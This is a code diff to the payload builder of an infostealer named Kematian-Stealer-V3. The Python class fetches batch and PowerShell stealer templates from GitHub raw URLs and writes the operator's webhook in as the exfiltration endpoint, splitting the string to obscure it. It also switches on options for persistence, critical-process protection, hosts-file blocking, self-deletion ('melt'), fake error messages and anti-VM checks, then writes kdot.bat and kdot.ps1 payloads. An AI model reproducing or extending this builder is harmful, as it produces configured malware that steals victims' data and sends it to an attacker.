@@ -7,6 +7,7 @@ class BuildPayload:
             "Powershell",
             "Batch",
         ]
+        self.encryption_key = ""
 
     def build(self, language: str, url: str, options: dict[str, bool]) -> bool:
         match language:
@@ -22,36 +23,62 @@ class BuildPayload:
     def get_languages(self) -> list[str]:
         return self.langs
 
-    def build_bat(self, url: str, options: dict[str, bool]) -> None:
-        github_raw_url_bat = "https://raw.githubusercontent.com/Somali-Devs/Kematian-Stealer-V3/main/frontend-src/main.bat"
-        content = requests.get(github_raw_url_bat).text.strip()
-
+    def _replace(
+        self,
+        content: str,
+        options: dict[str, bool],
+        url: str,
+        hashtags: bool = False,
+    ) -> str:
+        if hashtags:
+            hashtag = "#"
+            quotes = '"'
+        else:
+            hashtag = ""
+            quotes = "'"
         content = content.replace(
-            "$webhook = 'YOUR_URL_HERE_SERVER'", f"$webhook = 'h' + '{url[1:]}/data'"
+            f"{hashtag}$webhook = {quotes}YOUR_URL_HERE_SERVER{quotes}",
+            f"$webhook = 'h' + '{url[1:]}/data'",
         )
 
         content = (
             content.replace(
-                "$debug = $false", f"$debug=${str(options['debug']).lower()}"
+                f"{hashtag}$debug = $false",
+                f"$debug=${str(options['debug']).lower()}",
             )
             .replace(
-                "$blockhostsfile = false",
+                f"{hashtag}$blockhostsfile = $false",
                 f"$blockhostsfile=${str(options['blockhostsfile']).lower()}",
             )
             .replace(
-                "$criticalprocess = false",
+                f"{hashtag}$criticalprocess = $false",
                 f"$criticalprocess=${str(options['criticalprocess']).lower()}",
             )
-            .replace("$melt = false", f"$melt=${str(options['melt']).lower()}")
             .replace(
-                "$fakeerror = false",
+                f"{hashtag}$melt = $false",
+                f"$melt=${str(options['melt']).lower()}",
+            )
+            .replace(
+                f"{hashtag}$fakeerror = $false",
                 f"$fakeerror=${str(options['fakeerror']).lower()}",
             )
             .replace(
-                "$persistence = false",
+                f"{hashtag}$persistence = $false",
                 f"$persistence=${str(options['persistence']).lower()}",
             )
+            .replace(
+                f"{hashtag}$vm_protect = $false",
+                f"$vm_protect=${str(options['vm_protect']).lower()}",
+            )
         )
+
+        return content
+
+    def build_bat(self, url: str, options: dict[str, bool]) -> None:
+        github_raw_url_bat = "https://raw.githubusercontent.com/Somali-Devs/Kematian-Stealer-V3/main/frontend-src/main.bat"
+        content = requests.get(github_raw_url_bat).text.strip()
+
+        content = self._replace(content, options, url)
 
         with open("kdot.bat", "w", newline="") as f:
             f.write(content)
@@ -60,33 +87,7 @@ class BuildPayload:
         github_raw_url_ps1 = "https://raw.githubusercontent.com/ChildrenOfYahweh/Kematian-Stealer-V3/main/frontend-src/main.ps1"
         content = requests.get(github_raw_url_ps1).text.strip()
 
-        content = content.replace(
-            '#$webhook = "YOUR_URL_HERE_SERVER"', f"$webhook = 'h' + '{url[1:]}/data'"
-        )
-
-        content = (
-            content.replace(
-                "#$debug = $false", f"$debug = ${str(options['debug']).lower()}"
-            )
-            .replace(
-                "#$blockhostsfile = $false",
-                f"$blockhostsfile = ${str(options['blockhostsfile']).lower()}",
-            )
-            .replace(
-                "#$criticalprocess = $false",
-                f"$criticalprocess = ${str(options['criticalprocess']).lower()}",
-            )
-            .replace("$melt = $false", f"$melt = ${str(options['melt']).lower()}")
-            .replace(
-                "#$fakeerror = $false",
-                f"$fakeerror = ${str(options['fakeerror']).lower()}",
-            )
-            .replace(
-                "#$persistence = $false",
-                f"$persistence = ${str(options['persistence']).lower()}",
-            )
-            .replace("#$melt = $false", f"$melt = ${str(options['melt']).lower()}")
-        )
+        content = self._replace(content, options, url, hashtags=True)
 
         with open("kdot.ps1", "w", newline="") as f:
             f.write(content)
